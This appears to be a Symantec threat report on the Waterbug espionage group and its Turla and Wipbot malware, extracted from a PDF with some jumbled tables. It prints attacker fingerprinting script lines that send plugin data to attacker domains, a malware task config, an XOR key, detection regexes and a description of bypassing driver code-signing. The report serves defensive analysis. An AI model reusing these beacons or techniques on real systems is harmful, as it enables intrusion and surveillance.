The group has also been noted for its use of zero-day exploits and signing its malware with stolen certificates.\n\n Once the group gains a foothold, it shifts focus to long-term persistent monitoring tools which can be used to exfiltrate data and provide powerful spying capabilities. Symantec has tracked the development of one such tool, Trojan.Turla, and has identified four unique variants being used in the wild.\n\n\n-----\n\n### INTRODUCTION\n\n## Waterbug has successfully targeted and compromised over 4,500 computers across more than 100 countries.\n\n\n-----\n\n#### Introduction\n\n[Waterbug is the name given to the actors who use the malware tools Trojan.Wipbot (also known as Tavdig and](http://www.symantec.com/security_response/writeup.jsp?docid=2013-112916-3733-99)\nEpic Turla) and Trojan.Turla (also known as Carbon, Uroburos, and Snake). Believed to have been active since\nat least 2005, it is likely that the group was responsible for the 2008 compromise of US Central Command that\nreportedly resulted in a clean-up operation that lasted almost 14 months.\n\n[More recently, Waterbug used a zero-day exploit against the Microsoft Windows Kernel ‘NDProxy.sys’ Local](http://www.securityfocus.com/bid/63971)\n[Privilege Escalation Vulnerability (CVE-2013-5065), targeted emails, stolen certificates, and a sophisticated](http://www.securityfocus.com/bid/63971)\nwatering-hole distribution network known as Venom to compromise its victims. Waterbug has successfully\ntargeted and compromised over 4,500 computers across more than 100 countries. Targets include government\ninstitutions, embassies, and education and research facilities.\n\nThe malware used on victims’ computers, variants of Trojan.Turla and Trojan.Wipbot, are likely developed by or\nfor the Waterbug group. Trojan.Turla has four different sub-versions, something that may indicate professional\ndevelopment with code shared among multiple teams.\n\nBecause of the targets chosen, the use of at least one zero-day exploit, a large network of compromised\nwebsites, and the advanced nature of the malware used, Symantec believes that Waterbug is a state-sponsored\ngroup.\n\n#### Vectors\n\nSymantec have observed two techniques used by the Waterbug group to compromise victims: the use of highly\ntargeted emails containing malicious attachments and a set of compromised websites which ultimately deliver a\nmalicious payload.\n\n##### Spear-phishing\n\nIn December 2013, Symantec identified several spear-phishing attacks against specific individuals. The\nemails used in the\nattacks contained\na malicious Adobe\nReader attachment.\nThe attachment used\none zero-day exploit\n[against the Adobe](http://www.securityfocus.com/bid/62149)\n[Acrobat and Reader](http://www.securityfocus.com/bid/62149)\n[ToolButton Object Use-](http://www.securityfocus.com/bid/62149)\n[After-Free Remote Code](http://www.securityfocus.com/bid/62149)\n[Execution Vulnerability](http://www.securityfocus.com/bid/62149)\n(CVE-2013-3346) to\nelevate privileges and a\nsecond patched exploit\n(CVE-2013-5065) to\ndrop Trojan.Wipbot on\nthe target’s computer.\nThis was the first time\nSymantec had observed\nthis group use a zero-day\nexploit in the wild.\n\nThe majority of the\nemails observed in this\nspear-phishing attack\n_Figure 1. Example targeted email containing malicious PDF that drops Trojan.Wipbot_\n\n\n-----\n\nfollowed a common theme using subjects such as Defence Attaché Q1 meetings or Sochi 2014 Winter Olympics.\nAttachments were distributed as Adobe Reader attachments or executable files using an Adobe Reader icon.\n\n##### Venom distribution network\n\nSince at least September 2012, Symantec has identified 84 websites compromised by the Waterbug group. The\nchosen websites receive visitors of potential interest to the attackers—this is an example of a watering-hole\nattack. However, unlike traditional watering-hole attacks, where all visitors to a particular website are targeted\nindiscriminately, in the case of the Venom network used by the Waterbug group, the attackers use a more\ndeliberate approach. This is done in a multi-staged fashion by firstly redirecting visitors to another malicious\nserver. On the malicious server, a fingerprinting script is executed and this extracts configuration information\nfrom the user’s computer related to installed bowser plugins (Adobe Reader, Silverlight, Java, Flash etc.). The\nattackers also collect basic system and network information, such operating system version, type, browser\nversion, and internet protocol (IP) address.\n\nAt this point, the attackers have enough information to determine if the visitor is of further interest. When an IP\naddress of interest is identified, such as one associated with a government institution, they proceed to create\na rule specific to that IP address. This rule ensures that the next time the visitor arrives on the compromised\nwebsite their computer may be sent a malicious payload instead of just being fingerprinted.\n\nOne of the techniques that the attackers used to install the malicious payload is to attempt the installation\nof a Trojanized version of Adobe Shockwave. This malicious installer contains Trojan.Wipbot. Similarly,\nSymantec has also observed packages which have been used to drop both Trojan.Turla and Trojan.Wipbot.\nIt is believed that Trojan.Turla is also dropped in tandem with Trojan.Wipbot in order to provide multiple\ncommunication channels as a\nfailsafe when interacting with\nthe compromised computer.\nSymantec has also observed the\nattackers using Trojan.Wipbot\nto download updated versions\nof Trojan.Turla after initial\ninfection.\n\nOnce the attackers have gained\na foothold in the network, they\nuse Trojan.Turla to collect and\nexfiltrate data to a first-tier\nproxy. This tier is comprised of\nlegitimate, but compromised,\nwebsites. In a similar fashion,\ndata is relocated from the\nfirst-tier proxy to a second-tier\nproxy server under the control\nof the attackers. This is done\nto increase the complexity of\nthe attacker’s infrastructure\nand to make it more difficult to\nidentify.\n\n_Figure 2.Trojanized Shockwave installer package_\n\n\n-----\n\n###### Compromised websites (watering holes)\n\nSymantec telemetry suggests the Venom network consists of 84 compromised domains (websites). These\ncompromised websites are located in many different countries and were used in a watering-hole style operation\nin which the attackers monitored and filtered visitors to those websites and focused on the ones of interest for\nfurther action. The collection of compromised websites acted like a drag net designed to gather potential targets\nof interest.\n\nSymantec’s telemetry showed that thousands of computers visited the compromised websites between 2012\nand 2014. Figure 3 shows how many visitors visited the compromised websites and as a result, were redirected\nto another malicious server for fingerprinting. This is an indicator of how many computers were caught up in the\nnet and were scrutinized by the Waterbug attackers. The actual number of computers that became infected with\nWipbot and Turla was a much smaller subset.\n\n_Figure 3. Number of redirected computers between September 2012 and May 2014_\n\nDuring our observations, the number of compromised computers increased over time, with a noticeable spike in\nNovember, 2013. This spike coincided with an increase in traffic being redirected by the compromised websites\nto the malicious server. This increase in throughput may have come about because of an increase in the number\nof compromised websites in use.\n\n###### Where are the compromised websites?\n\nThe watering-hole websites used by the Waterbug group are located in many different countries. The greatest\nnumber of compromised websites is found in France (19 percent), Germany (17 percent), Romania (17 percent),\nand Spain (13 percent).\n\n\n-----\n\n###### Common vector\n\nAnalysis of the compromised\nwebsites shows that the majority\nof them used a common content-\nmanagement system (CMS) known\nas TYPO3. Moreover, a number of\ncompromised websites also resided\non the same net block linked to a\nnumber of hosting providers. These\nhosting providers’ websites promote\nthe use of CMS-type tools, including\nTYPO3, as blogging platforms\nincluded in their hosting packages.\n\n###### Industry breakdown\n\nThe compromised websites were\nfurther categorized based on their\nrespective industries. The majority\nof compromised websites were\ngovernment related (26 percent).\nThe list included embassies,\nministries of foreign affairs, and\nother government institutions.\nPublishing and media websites\n(23 percent) were also used by the\nattackers. In this case, the majority _Figure 4. Top ten countries with compromised websites (watering holes)_\nof compromised publishing websites\nwere local news and broadcasting\ncompanies.\n\nDespite the range and number of\nwebsites compromised and set up as\nwatering holes, the attackers were\nonly interested in a very specific\nsubset of the users who actually\nvisited these websites.\n\nIn effect, the collection of\ncompromised websites acted as a\nnet, much like a fishing net trawling\nfor fish in the ocean. In this case,\nthe net is set up so that unwanted\ncatches are allowed to escape\nunscathed but the ones of interest\nwere redirected (based on their\nsource IP address) to deliver the\npayload of Wipbot or Turla or both.\n\n_Figure 5. Compromised sites categorized by industry_\n\n\n-----\n\n### MALWARE\n\n## Whether compromised by a targeted email attack or by browsing to an infected website... Trojan.Turla or Trojan.Wipbot is installed onto the victim’s computer\n\n\n-----\n\n#### Malware\n\nWhether compromised by a targeted email attack or by browsing to an infected website on the Venom network,\nin both cases either Trojan.Turla or Trojan.Wipbot is installed onto the victim’s computer.\n\n##### Trojan.Wipbot\n\nTrojan.Wipbot was first identified by Symantec in December, 2013 being distributed by a highly-targeted\nspear-phishing campaign. Later, additional samples, including Trojanized Shockwave installers signed with a\nstolen certificate, were also observed being distributed by the Venom network. Trojan.Wipbot is a downloader\nwith limited back door functionality. Trojan.Wipbot has the ability to execute arbitrary commands and additional\ndownloaded components on the infected computer. This is done through the use of a task file.\n\nTask files consist of several sections. The first section is the command\nnumber or ID, followed by the payload size, the payload itself, and an\nassociated configuration script. The payload size is used by Trojan.Wipbot\nto allocate the correct amount of memory in order to store the binary. The\npayload can be an executable file (.exe or .dll) or a Windows batch script. In\nthe majority of cases, Symantec has observed the attackers downloading\nbatch files in order to perform reconnaissance activities on the infected\nnetwork such as the collection of network and domain-specific information\nand login credentials to mount shares and move laterally across the\nnetwork.\n\nA configuration script is also supplied by the attackers, which specifies the\nlocation of the file, supplied arguments, and where resultant data should be\nwritten to. The following example also instructs Trojan.Wipbot to delete the\nscript after execution.\n```\n           [CONFIG]\n           name = C:\\windows\\temp\\wincpt.bat\n           arg = cmd.exe /c c:\\windows\\temp\\wincpt.bat\n           result = c:\\windows\\Temp\\DMR0861.dat\n           delete = yes\n\n```\n_Figure 6. Example of Trojan.Wipbot_\n\nThe collected data is later retrieved by the attackers using additional tools. _task file structure_\n\n###### Links between Trojan.Wipbot and Trojan.Turla\n\nSymantec has confirmed several links tying Trojan.Wipbot and Trojan.Turla to the same group through sample\nanalysis and telemetry.\n\n        - Trojan.Wipbot contains an embedded component known as Down.dll. The header of the component has\nbeen stripped. The DLL itself has an export function which matches those used in Trojan.Turla samples\n(ModuleStart, ModuleStop).\n\n[• In Trojan.Wipbot, a Linear Congruential Generator (LCG) is used as part of the malware’s communication](http://en.wikipedia.org/wiki/Linear_congruential_generator)\nprotocol, specifically for encryption. Generally an LCG is used as part of a pseudo-random number generator\n(PRNG) in an encryption algorithm. However, in Trojan.Wipbot’s case, it uses the LCG to perform the encryption\ninstead. Symantec has not observed LCG used for encryption of communications before. Remnants of LCG\ncode used for encryption are also present in Trojan.Turla, specifically the same c-constant value and modulus.\n\n         - Both Trojan.Wipbot and Trojan.Turla also share a similar code structure in terms of decryption algorithms.\nBoth use an array of characters which are stored directly on the stack followed by a simple XOR operation by a\nshared constant.\n\n        - Finally, Symantec has observed Trojan.Wipbot downloading Trojan.Turla onto compromised computers.\n\n\n-----\n\n##### Trojan.Turla\n\nIn 2008, a malware incident was reported to have affected the US Central Command Network. The incident\nwas the direct result of an infected removable drive that was connected to a computer on the network, which\n[executed an autorun file launching a malicious DLL file stored on the drive. This was dubbed the BTZ Incident](http://blog.threatexpert.com/2008/11/agentbtz-threat-that-hit-pentagon.html)\nand was considered one of the worst breaches of US military computers in history. The malware, which\n[Symantec called Trojan.Minit (also known as Agent.BTZ), had the ability to spread through a network, gather](http://www.symantec.com/security_response/writeup.jsp?docid=2005-010722-5132-99)\nsensitive information, and exfiltrate data to a remote command-and-control (C&C) server.\n\nSince then, multiple links have been established between Trojan.Minit and recent samples of Trojan.Turla. The\nmost infamous link is the use of a shared XOR key across these two families. This key has been used by the\nattackers to encrypt log data and has also been used in a number of custom tools used by the Waterbug group.\n\nTrojan.Turla is an extremely persistent, sophisticated malware, professionally developed with extensible\ncapabilities and used exclusively by the Waterbug group. Trojan.Turla is built from a framework that is designed\nfor long-term monitoring of targeted individuals or organizations and has been in operation since at least 2005.\nBoth 32-bit and 64-bit samples have been identified in use in the wild. Analysis has determined that Trojan.\nTurla is essentially an extensible platform which appears to share common components between variants\nthrough the use of a common framework.\n\nSymantec has identified four unique variants of Trojan.Turla, all of which use shared components. Details on the\nrelationships between the variants are discussed in the following section.\n\n###### Variants\n\n_Figure 7. Variants of Trojan.Turla identified by Symantec_\n\nSymantec has identified four unique variants of Trojan.Turla which have been in development between 2005 and\n2014.\n\n        - ComRAT is a direct descendant of the Agent.BTZ malware that was in use in 2008. Development of this variant\nhas continued and recent samples, compiled in 2013, have been identified.\n\n         - The earliest variant of FA (so named because of debug strings linking to project fa64) was compiled in 2005.\n\n\n-----\n\nThis variant has seen continuous development from 2009 to 2014.\n\n         - Carbon is the most unique of all four variants. Carbon is distributed in two forks—a driver-based version\n(rootkit) and a driver-less version. Early variants of Carbon were identified in 2007, 2008, and 2009. The\nmajority of Carbon’s code has received minor incremental updates seen in recent samples identified in 2014.\nThe most closely related variant to Carbon is SAV.\n\n         - SAV (also known as Uroburos) is a recent variant of Trojan.Turla which has been in development since at least\n2011 and has received incremental updates through to 2014.\n\nAnalysis of these variants shows common code structures, shared components, and a continuous development\nwhich has run in parallel since at least 2005.\n\n###### Relationships\n\nThe identified cases of code sharing are usually within specific sub-modules, such as IDT Hooking, or within\nhelper code. An examination of features from the Carbon and FA drivers in this section illustrates this. The\nrelationship between Carbon and SAV is more complex and will be described separately.\n\n###### Carbon and SAV\n\nWhen Carbon was first developed, the driver-based and driver-less forks used a custom communication module\nwhich supported multiple protocols including Transmission Control Protocol (TCP), Named Pipes (NP), and\nMultipoint-to-Point (M2P). When SAV first appeared in 2011, it was based on the driver-based fork of Carbon.\nHowever, injected components were significantly changed or possibly rewritten. Shared features included the\ncommunication module. This suggests that SAV is derived from Carbon.\n\n###### FA, Carbon, and SAV\n\nIn June 2007, Carbon drivers already included the use of specific error code values which may have originally\nbeen implemented as part of the communication channel code. FA Drivers introduced the use of these error code\nvalues between August, 2008 and December, 2009 as part of a major refactoring effort.\n\nAdditionally, FA and SAV also shared a custom packer used exclusively by the Waterbug group. By 2009, FA had\nbegun using the custom packer for user-mode components. Carbon did not use the packer in any of the collected\nsamples, whereas SAV used the packer for multiple components.\n\nThese relationships indicate that features were developed separately, and later migrated to other projects. This\nsharing may be due to copying parts of source code (possibly entire folders) between independently developed\nprojects.\n\n\n-----\n\n###### Shared features\n\n_Figure 8. Shared features across Trojan.Turla variants_\n\nThe driver-based column indicates rootkit functionality such as that found in Carbon and SAV. The driver-less\ncolumn indicates the use of user-mode API hooking. An encrypted file system was also found in two of the\nvariants, Carbon and SAV. This is an NTFS file, encrypted using 128-bit CAST in CBC mode. In other variants, a\ndirectory structure was used and encryption was performed using simple byte-by-byte XOR encryption (using the\nsame key used in Agent.BTZ). Code sharing shows trace evidence or remnants of code from earlier versions still\npresent in recent samples. One such example is the use of LCG and associated constant values in the decryption\nalgorithm.\n\n#### Conclusion\n\nWaterbug is a capable group that is highly skilled in compromising its targets and has systematically targeted\ngovernments and embassies since as early as 2005. The continued development of the tools used by Waterbug\nsuggests that the group has made a significant investment in time and resources. This coupled with the selected\ntargets and the advanced nature of the malware used suggests that Waterbug is most likely a state-sponsored\ngroup whose motive is intelligence gathering.\n\n\n-----\n\n### APPENDIX\n\n\n-----\n\n|Table 1.

The\nPluginDetect library is intended to work with all the major browsers including Internet Explorer 6 and up, Firefox,\nMozilla, Netscape, Chrome, Safari, Opera, SeaMonkey, Flock, and others. It is possible to generate custom\nPluginDetect scripts which only retrieve version information for specifically chosen plugins as per\n[http://www.pinlady.net/PluginDetectArchive/0.8.5/download/.](http://www.pinlady.net/PluginDetectArchive/0.8.5/download/)\n\nSymantec has identified two versions of the main.php script file.

Depending on the version of the main.php script used to collect plugin information, it either performs a GET\nrequest or a POST request using the following parameters:\n\n###### POST request\n```\n           xmlhttp.send(‘js=’ + encodeURIComponent(js) + ‘&v _ s=’ +\n           encodeURIComponent(v _ s) + ‘&v _ f=’ + encodeURIComponent(v _ f) + ‘&v _ a=’\n           + encodeURIComponent(v _ a) + ‘&v _ m=’ +encodeURIComponent(v _ m)+ ‘&v _ q=’+\n           encodeURIComponent(v _ q) + ‘&msw=’ + encodeURIComponent(msw) + ‘&v _ ja=’\n           + encodeURIComponent(v _ ja) + ‘&ref=’ + encodeURIComponent(ref));\n\n```\nExample\n```\n           image.servepics.com/css/ajax.php?js=ok&v _ s=null&v _ f=11.8.800.94&v _\n           a=11.0.0.0&v _ m=null&v _ q=null&msw=2007&v _ ja=1.7.0.51&ref=http%3A//www.bjc.\n           es/&v _ sl=5.1.20513.0\n\n###### GET request\n\n```\nwindow.location.href = ‘wreq.php?js=ok&v _ s=’+shock()+’&v _ f=’+fla()+’&v _\n```\n           a=’+acro()+’&v _ m=’+v _ m+’&v _ q=’+qtime()+’&msw=’+offchk()+’&v _ ja=’+jav()+’&ref\n           =’+escape(ref)+’&v _ sl=’+silver();}\n\n```\nExample\n```\n           image.servepics.com/css/wreq.php?js=ok&v _ s=null&v _ f=12.0.0.41&v _ a=null&v _\n           m=null&v _ q=null&msw=null&v _ ja=1.7.0.51&ref=http%3A//www.motril.es/index.\n           php%3Fid%3D359&v _ sl=null\n\n###### Additional PluginDetect files\n\n```\nSymantec has identified one additional script (similar to ajax.php and wreq.php) that performs the same actions\npreviously described. It is possible that these files represent different versions of the backend script used to\nparse the collected information used in the attack.\n\n        - /css/ajax.php\n\n        - /css/ajax.php _Table 2.

Only present in main.php\n(MD5: bd07a78793641dc85cf75dc60c06051a).\n\n\n-----\n\nAll plugin scripts use the PluginDetect library from version 0.8.5 with the exception of main.php\n(MD5: bd07a78793641dc85cf75dc60c06051a) which uses the PluginDetect script version 0.8.6 for Silverlight.\n\n##### Exploits\n\nThe scripts (main.php, main.jpg, wreq.php etc) contained additional code which is used to exploit Internet\nExplorer 6, 7, and 8. Additional exploits were also identified targeting Oracle Sun Java and Adobe Flash Player\n[using the Oracle Java SE Remote Code Execution Vulnerability (CVE-2012-1723). Unfortunately, not all exploits](http://www.securityfocus.com/bid/53960)\ncould be retrieved for analysis.\n\nThe payload dropped by the Java\nexploit was found to be:\n\n       - MD5: d7ca9cf72753df7392bfeea834\nbcf992\n\nThe above sample was confirmed as\nTrojan.Wipbot.\n\n##### Trojanized applications\n\nThe attacker group also used\nTrojanized applications in order to\ntrick users into installing a malicious\npayload. In one such example, a\nShockwave Player installer bundle was\nfound to be Trojanized and silently\ninstalled Trojan.Wipbot.\n\nThe installer was signed with\na certificate from Sysprint, an\norganization based in Switzerland.\n\n_Figure 9. Trojanized Shockwave installer bundle_\n\nThere have been additional reports of\nTrojanized Microsoft Security Essential\npackages being used.\n\n_Figure 10.

The packer used with Trojan.Turla is unique to the group and has not been observed being used\nwith any other malware.\n\nThis custom packer, used exclusively by the Waterbug group, was used for packing various components since\nat least 2009. The stub included in the packed driver-based variants includes the same error code value ranges\nas was observed in Waterbug-specific communication\ncode. This is a strong indication that attackers maintain\n\n_Table 3. Error code messages_\n\nthe packer in-house.\n\nError code Message\n\nIt was found that the FA dropper from 2009\n\n0 no error\n\nincluded a non-packed driver and a packed external\ncommunication component, but the dropper from 2011 ffffffff error has been suddenly occured\nincluded a packed driver and a non-packed external 21590001 function unsupported\ncommunication component. However, for SAV, the 21590002 timeout condition has been occured inside call\ndropper, driver, and other components were all packed of function\nusing the custom packer from 2011.\n\n21590003 peer has closed the connection\n\nSymantec is aware of five generations of the custom 21590004 no memory\npacker: 21590005 object not found\n\n        - Custom A was encountered in FA external 21590006 execution has been canceled\ncommunication component (February-December 21590007 not enough server resources to complete opera-\n2009) tion\n\n        - Custom B, variant preA was encountered 21590008 access violation\nin FA dropper (January 2010)\n\n21590009 socket error\n\n        - Custom B, variant A was encountered in FA external\n\n2159000a invalid network buffer received\n\ncommunication component (June 2010)\n\n        - Custom B, variant B was encountered in various SAV 2159000b too long data for this type of transport\ncomponents (June 2011-May 2013) and FA driver 2159000e no data was received\n(December 2012-January 2014) 21590064 invalid function call\n\n        - Custom B, variant C encountered in SAV driver 21590065 sanity check: invalid parameter 1 in function call\n(October 2013-March 2014)\n\n21590066 sanity check: invalid parameter 2 in function call\n\nIt is worth noting that another, somewhat simpler, 21590067 sanity check: invalid parameter 3 in function call\npacker was used for packing the Trojan.Wipbot dropper\n\n21590068 sanity check: invalid parameter 4 in function call\n\n(custom dotNET used by single sample).\n\n21590069 sanity check: invalid parameter 5 in function call\n\n###### Error code ranges 2159006a sanity check: invalid parameter 6 in function call\n\nMany of the Waterbug-specific subroutines present 2159006b sanity check: invalid parameter 7 in function call\nin various kernel-mode samples use constants from 2159006c sanity check: invalid parameter 8 in function call\nrange 0x21590001..0x21590258 as error codes. It 2159006d sanity check: invalid parameter 9 in function call\nis interesting to note that this range corresponds to\n\n215900c8 invalid address specified\n\n0xDEA6FXXX.\n\n215900c9 invalid local address\n\nThe following components include code with these 215900ca invalid local port\nconstants:\n\n215900cb invalid remote address\n\n        - Stub of custom packer present in packed kernel-mode\n\n215900cc invalid remote port\n\nbinaries\n\n2159012c invalid credentials\n\n         - FA drivers (except for samples earlier then 2008)\n\n        - Carbon drivers 2159012d secure connection failed\n\n        - SAV drivers 21590258 licence error\n\n\n-----\n\nSeveral samples also include a table mapping these error codes to messages. This table is apparently part of a\nsource file with the following versioning information:\n```\n           $Id: t _ message1.c 5290 2007-01-26 11:15:03Z vlad $\n\n```\nThe table mapping error codes to messages is composed of a number of entries (See Table 3).\n\nWith all verified components, error codes seem consistent with the above table. However, use of additional error\ncodes within this range were also observed that are not included in this table.\n\n###### Additional shared features\n\nAdditional shared features observed during analysis are detailed below.\n\n###### IDT hooking\n\nSymantec observed sharing of IDT hooking code used in FA, Carbon (not present in samples earlier than 2009),\nand SAV drivers. All have been observed using interrupts 0x55 or 0xC3 in the following method:\n```\n           kd> u nt!NtReadFile\n           nt!NtReadFile:\n           8057c4a8 6a06      push  6 ; integer pushed.\n           8057c4aa cdc3      int   0C3h ; interrupt.\n           8057c4ac 94       xchg  eax,esp\n           8057c4ad 4d       dec   ebp\n           8057c4ae 80e88c     sub   al,8Ch\n           8057c4b1 f8       clc\n           8057c4b2 fb       sti\n           8057c4b3 ff33      push  dword ptr [ebx]\n\n```\nIt is worth noting that higher-level code implemented on top of these hooks differ significantly across variants,\nwhere SAV is considered the most sophisticated.\n\n###### FA source code tree\n\nThe FA variant includes debug string information that corresponds to source code files. Some full and partial\npaths are also indicated in the strings. It is possible that the source code tree for FA may have contained the\nfollowing directory structure:\n```\n           d:\\proj\\cn\\fa64\\common\\helpers\\ntsystem\\../../unichar _ common.c\n                 ..\\common\\helpers\\ntsystem\\event.c                \n           $Id: event.c 14097 2010-11-01 14:46:27Z gilg $\n                 ..\\common\\helpers\\ntsystem\\mutex.c                \n           $Id: mutex.c 14516 2010-11-29 12:27:33Z gilg $\n                 ..\\common\\helpers\\ntsystem\\named _ mutex.c             \n           $Id: named _ mutex.c 15594 2011-03-18 08:04:09Z gilg $\n                 ..\\common\\helpers\\ntsystem\\nt.c                 \n           $Id: nt.c 20719 2012-12-05 12:31:20Z gilg $\n                 ..\\common\\helpers\\ntsystem\\rw _ lock.c               \n           $Id: rw _ lock.c 14516 2010-11-29 12:27:33Z gilg $\n                 ..\\common\\helpers\\ntsystem\\unichar.c               \n           $Id: unichar.c 14481 2010-11-27 19:52:15Z gilg $\n                 ..\\common\\helpers\\interface _ s.c\n           d:\\proj\\cn\\fa64\\common\\loadlib\\common/loadlib _ helpers.c\n           d:\\proj\\cn\\fa64\\common\\loadlib\\win/loadlib.c\n           d:\\proj\\cn\\fa64\\uroboros\\rk _ common\\libhook\\common/libunhook.c\n           d:\\proj\\cn\\fa64\\uroboros\\rk _ common\\libhook\\common/hook _ helpers.c\n           d:\\proj\\cn\\fa64\\uroboros\\rk _ common\\libhook\\common/libhook.c\n           d:\\proj\\cn\\fa64\\uroboros\\rk _ common\\libhook\\common/idthook.c\n           d:\\proj\\cn\\fa64\\uroboros\\rk _ common\\libhook\\ntsystem/libhook.c\n                 ..\\k2\\fa _ registry.c\n\n```\n\n-----\n\n```\n                 ..\\k2\\syshook.c\n\n```\nThe code tree suggests that there may be common helper code shared, such as rootkit functionality (rk_common,\ncommon\\helpers etc.). It is likely that these components are shared across variants of Trojan.Turla.\n\nThis is also consistent with the PDB strings extracted from FA variants:\n```\n           d:\\proj\\cn\\fa64\\sengoku\\ _ bin\\sengoku\\win32 _ debug\\sengoku _ Win32.pdb\n\n###### Agent.BTZ XOR key\n\n```\nA number of keys are shared across the Trojan.Turla variants. Of particular interest is the following XOR key\nknown from Agent.BTZ. This key has also been identified in a number of tools used by the Waterbug group:\n```\n           1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs9\n           23HL34x2f5cvd0fk6c1a0s\\x00\n\n```\nThe above XOR key was found in ComRAT and FA components starting from 2006.\n\n###### Encrypted file system\n\nCarbon (driver-based) and SAV utilize an encrypted file system (EFS) to store configuration files, log information,\ntools, and exfiltrated data. These variants use CAST-128 bit encryption in CBC mode. A unique initialization key\n(IV) was used across these drivers:\n```\n           A1D210B76D5EDA0FA165AFEF79C366FA\n\n```\nNote other samples also have remnants of the EFS code which is never used.\n\n##### Detection guidance\n\n###### Targeted injection attacks\n\n Iframe injection\n\nUpon visiting a compromised domain, the user is redirected to a dynamic DNS host which performs\nfingerprinting operations to identify the version information for several browser plugins, as described in the\ntechnical details of this document.\n\nExamples\n\n        - [http://]image.servepics.com/css/main.php\n\n        - [http://]cqcount.servehttp.com/css/main.php\n\n        - [http://]newsweek.serveblog.net/wp-includes/js/css/main.php\n\nRegex\n\n         - .*\\/css\\/main\\.php.*\n\n###### Fingerprinting\n\nOnce a user has been successfully redirected, a PluginDetect script is loaded. This identifies version information\nfor Java, Flash, Adobe Reader, QuickTime, Shockwave, Silverlight etc.\n\nExamples\n\n        - adobes3.sytes.net/macromedia/get/shockwave/latest/sitenavigation.js\n\n        - adobe.serveusers.com/macromedia/get/shockwave/latest/sitenavigation.php\n\nRegex\n\n        - .*\\/macromedia\\/get\\/shockwave\\/latest\\/sitenavigation.*\n\nThe collected information is POST’ed to another page hosted on the same domain.

The vulnerabilities used are as follows:\n\n           - [Sun xVM VirtualBox ‘VBoxDrv.sys’ Local Privilege Escalation Vulnerability (CVE-2008-3431)](http://www.securityfocus.com/bid/30481)\n\n           - [Microsoft Windows #GP Trap Handler Local Privilege Escalation Vulnerability (CVE-2010-0232)](http://www.securityfocus.com/bid/37864)\n\n           - [Microsoft Windows Argument Validation Local Privilege Escalation Vulnerability (CVE-2009-1125)](http://www.securityfocus.com/bid/35240)\n\n###### Sun xVM VirtualBox ‘VBoxDrv.sys’ Local Privilege Escalation Vulnerability (CVE- 2008-3431)\n\nThis vulnerability lets attackers get access to the g_CiEnabled flag which is supposed to be protected. This\nvulnerability is used by most of the driver-based exploits.\n\nAttackers can exploit a device IO vulnerability in the VBoxDrv.sys driver to set the g_CiEnabled flag to 0, allowing\nany driver to be installed without performing code-signing checks.\n\nThe g_CiEnabled is a Windows flag that sets or resets when the computer restarts. This flag indicates whether\nWindows should validate digital signatures before loading a driver. By default, x64 computers only allow signed\ndrivers to be installed. A pseudo-code description of SepInitializeCodeIntegrity follows:\n\nVOID SepInitializeCodeIntegrity()\n```\n           {\n           DWORD CiOptions;\n           g _ CiEnabled = FALSE;\n           if(!InitIsWinPEMode)\n            g _ CiEnabled = TRUE;\n\n```\nThe g_CiEnabled flag is set when the computer restarts, depending on whether the computer is being booted in\nWinPE mode or not. Furthermore, whenever a driver is being loaded after the computer restarts, the operating\nsystem checks for this flag before validating the signature in the SeValidateImageHeader() function. In order\nto load the unsigned Uroburos driver, the attackers first gain access to the g_CiEnabled flag and then set it to\nzero. This resets the code-signing policy on the computer. However, resetting the flag requires kernel privileges.\nBecause of this, the malware exploits a device IO vulnerability from an already signed driver (VBoxDrv.sys) to\n\n\n-----\n\n|Table 5.

The\nmalware then uses ci.dll to locate the CiInitialize() function address and finally the address of the g_CiEnabled\nflag.\n\nThe vboxdrv_win32.dll file has the signed VirtualBox driver (eaea9ccb40c82af8f3867cd0f4dd5e9d) embedded in\nit. It loads this legitimate driver and then exploits the vulnerability to disable code-signing policy.\n\n###### Microsoft Windows #GP Trap Handler Local Privilege Escalation Vulnerability (CVE-2010-0232)\n\nThe ms10_025_win32.dll file exploits a privilege escalation vulnerability in the #GP trap handler.
